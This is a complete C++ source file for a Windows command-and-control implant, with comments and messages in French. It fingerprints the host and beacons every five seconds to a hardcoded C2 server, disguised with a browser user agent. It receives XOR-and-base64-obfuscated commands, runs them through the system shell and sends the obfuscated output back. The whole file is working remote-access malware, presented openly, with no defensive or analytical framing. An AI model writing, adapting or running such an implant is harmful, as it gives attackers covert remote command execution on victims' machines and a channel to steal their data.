#include <windows.h>
#include <wininet.h>
#include <iostream>
#include <string>
#include <thread>
#include <chrono>
#include <cstdio>
#include <sstream>
#include <vector>
#include <algorithm>
#define UNLEN 127
#include <psapi.h>
#include <exception>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "psapi.lib")

const std::string XOR_KEY = "mysecretkey";

// -- Base64 C++ pur, aucune dépendance --
static const std::string b64_chars =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    "abcdefghijklmnopqrstuvwxyz"
    "0123456789+/";

std::string base64_encode(const std::string &in) {
    std::string out;
    int val=0, valb=-6;
    for (uint8_t c : in) {
        val = (val<<8) + c;
        valb += 8;
        while (valb>=0) {
            out.push_back(b64_chars[(val>>valb)&0x3F]);
            valb-=6;
        }
    }
    if (valb>-6) out.push_back(b64_chars[((val<<8)>>(valb+8))&0x3F]);
    while (out.size()%4) out.push_back('=');
    return out;
}
std::string base64_decode(const std::string &in) {
    std::vector<int> T(256,-1);
    for (int i=0; i<64; i++) T[b64_chars[i]] = i;
    std::string out;
    int val=0, valb=-8;
    for (uint8_t c : in) {
        if (T[c] == -1) break;
        val = (val<<6) + T[c];
        valb += 6;
        if (valb>=0) {
            out.push_back(char((val>>valb)&0xFF));
            valb-=8;
        }
    }
    return out;
}

std::string xor_data(const std::string &data, const std::string &key) {
    std::string out = data;
    size_t klen = key.length();
    for (size_t i = 0; i < out.size(); ++i)
        out[i] ^= key[i % klen];
    return out;
}

std::string get_hostname() {
    char hostname[MAX_PATH] = { 0 };
    DWORD size = sizeof(hostname);
    if (GetComputerNameA(hostname, &size))
        return hostname;
    return "unknown_host";
}

std::string get_username() {
    char username[UNLEN + 1] = { 0 };
    DWORD size = UNLEN + 1;
    if (GetUserNameA(username, &size))
        return username;
    return "unknown_user";
}

std::string get_process_name() {
    char proc_name[MAX_PATH] = { 0 };
    if (GetModuleFileNameA(NULL, proc_name, MAX_PATH)) {
        std::string s(proc_name);
        size_t pos = s.find_last_of("\\/");
        if (pos != std::string::npos) return s.substr(pos + 1);
        return s;
    }
    return "unknown_process";
}

std::string generate_agent_id() {
    return get_hostname() + "_" + get_username() + "_" + get_process_name();
}

void wininet_error(const char* msg) {
    DWORD err = GetLastError();
    std::cout << "[!] " << msg << " (GetLastError=" << err << ")" << std::endl;
}

std::vector<std::string> parse_tasks(const std::string& json) {
    std::vector<std::string> res;
    size_t p = json.find("\"tasks\"");
    if (p == std::string::npos) return res;
    p = json.find('[', p);
    if (p == std::string::npos) return res;
    size_t q = json.find(']', p);
    if (q == std::string::npos) return res;
    std::string arr = json.substr(p+1, q-p-1);
    size_t start = 0, end;
    while ((end = arr.find('"', start)) != std::string::npos) {
        size_t s = end+1;
        end = arr.find('"', s);
        if (end == std::string::npos) break;
        res.push_back(arr.substr(s, end-s));
        start = end+1;
    }
    return res;
}

std::string http_get(const std::string& hostname, int port, const std::string& path, const std::string& user_agent, const std::string& extra_headers, const std::string& agent_id) {
    HINTERNET hInternet = InternetOpenA(user_agent.c_str(), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) { wininet_error("InternetOpenA failed"); return ""; }
    HINTERNET hConnect = InternetConnectA(hInternet, hostname.c_str(), port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) { wininet_error("InternetConnectA failed"); InternetCloseHandle(hInternet); return ""; }
    const char *acceptTypes[] = {"*/*", NULL};
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", path.c_str(), NULL,NULL, acceptTypes, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hRequest) { wininet_error("HttpOpenRequestA failed (GET/POST)"); InternetCloseHandle(hConnect); InternetCloseHandle(hInternet); return ""; }
    std::stringstream post_data;
    post_data << "{\"agent_id\":\"" << agent_id << "\", \"hostname\":\"" << get_hostname() << "\", \"username\":\"" << get_username() << "\", \"process_name\":\"" << get_process_name() << "\" }";
    std::string headers = extra_headers + "\r\nContent-Type: application/json\r\n";
    BOOL res = HttpSendRequestA(hRequest, headers.c_str(), headers.length(), (LPVOID)post_data.str().c_str(), post_data.str().length());
    if (!res) { wininet_error("HttpSendRequestA failed (POST)"); InternetCloseHandle(hRequest); InternetCloseHandle(hConnect); InternetCloseHandle(hInternet); return ""; }
    std::string buffer;
    char data[4096];
    DWORD bytesRead = 0;
    while (InternetReadFile(hRequest, data, sizeof(data) - 1, &bytesRead) && bytesRead != 0) {
        data[bytesRead] = 0;
        buffer += data;
    }
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return buffer;
}

bool http_post(const std::string& hostname, int port, const std::string& path, const std::string& user_agent, const std::string& extra_headers, const std::string& data) {
    HINTERNET hInternet = InternetOpenA(user_agent.c_str(), INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) { wininet_error("InternetOpenA failed"); return false; }
    HINTERNET hConnect = InternetConnectA(hInternet, hostname.c_str(), port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) { wininet_error("InternetConnectA failed"); InternetCloseHandle(hInternet); return false; }
    const char *acceptTypes[] = {"*/*", NULL};
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", path.c_str(), NULL, NULL, acceptTypes, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hRequest) { wininet_error("HttpOpenRequestA failed (POST)"); InternetCloseHandle(hConnect); InternetCloseHandle(hInternet); return false; }
    std::string headers = extra_headers + "\r\nContent-Type: application/json\r\n";
    BOOL res = HttpSendRequestA(hRequest, headers.c_str(), headers.length(), (LPVOID)data.c_str(), data.length());
    if (!res) { wininet_error("HttpSendRequestA failed (POST)"); InternetCloseHandle(hRequest); InternetCloseHandle(hConnect); InternetCloseHandle(hInternet); return false; }
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return true;
}

std::string exec_cmd(const std::string& cmd) {
    std::string result;
    char buffer[512];
    FILE* pipe = _popen(cmd.c_str(), "r");
    if (!pipe) return "Error opening pipe";
    while (fgets(buffer, sizeof(buffer), pipe) != NULL)
        result += buffer;
    _pclose(pipe);
    return result;
}

int main() {
    std::setvbuf(stdout, NULL, _IONBF, 0);

    std::string hostname = "192.168.66.14"; // <-- Mets L'IP de ton serveur ici
    int port = 80;
    std::string user_agent = "Mozilla/5.0";
    std::string header = "Accept: application/json\r\n";
    std::string path_api = "/api";
    int beacon_interval = 5;

    std::string agent_id = generate_agent_id();

    while (true) {
        std::string response = http_get(hostname, port, path_api, user_agent, header, agent_id);
        auto cmds = parse_tasks(response);

        for (const std::string& cmd_b64 : cmds) {
            std::string decoded = base64_decode(cmd_b64);
            std::string cmd = xor_data(decoded, XOR_KEY);
            std::string output;
            bool cmd_success = true;

            try {
                output = exec_cmd(cmd);
            } catch (const std::exception& e) {
                output = std::string("[!] Exception: ") + e.what();
                std::cout << "[!] Exception lors de l'exécution de la commande: " << e.what() << std::endl;
                cmd_success = false;
            } catch (...) {
                output = "[!] Erreur inconnue lors de l'exécution";
                std::cout << "[!] Erreur inconnue lors de l'exécution de la commande !" << std::endl;
                cmd_success = false;
            }

            try {
                std::string xor_result = xor_data(output, XOR_KEY);
                std::string result_b64 = base64_encode(xor_result);

                std::ostringstream ss;
                ss << "{";
                ss << "\"agent_id\":\"" << agent_id << "\"";
                ss << ",\"result\":\"";
                ss << result_b64;
                ss << "\"}";
                std::string result_json = ss.str();
                std::string results_path = "/agent/" + agent_id + "/push_result";
                bool ok = http_post(hostname, port, results_path, user_agent, header, result_json);
                if (!ok) {
                    std::cout << "[!] POST du résultat au C2 a échoué !" << std::endl;
                }
            } catch (const std::exception& e) {
                std::cout << "[!] Exception lors de la construction ou POST du JSON résultat : " << e.what() << std::endl;
            } catch (...) {
                std::cout << "[!] Erreur inconnue durant la construction/POST JSON résultat !" << std::endl;
            }
        }

        std::this_thread::sleep_for(std::chrono::seconds(beacon_interval));
    }
    return 0;
}
